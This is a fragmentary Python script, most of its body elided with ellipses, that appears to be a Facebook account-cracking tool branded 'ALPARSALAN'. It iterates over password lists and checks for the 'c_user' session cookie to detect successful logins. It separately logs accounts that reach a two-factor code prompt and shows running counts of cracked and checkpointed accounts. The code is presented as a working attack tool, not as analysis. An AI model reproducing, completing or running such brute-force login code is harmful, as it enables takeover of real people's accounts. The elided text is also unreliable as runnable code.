...
#--------------------LOGO--------------------#
logo       _____  .____   __________  _____ __________  _________   _____  .____       _____    _______   
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                ...
                if 'Enter login code to continue' in str(d):
                    print('\r\033[1;35m[ALPARSALAN-2F] '+ids+' | '+pas+'\033[1;97m')
                    tf.append(ids)
...
def Filex():
    ...
    print("[0] EXIT")
    linex() 
    check=input(f" CHOOSE {ALPARSALAN} :")
    if check in ['01','1']:
        file_m()
    elif check in ['02','2']:
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[ALPARSALAN] [%s] \33[1;97m[OK:%s{ALPARSALAN}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
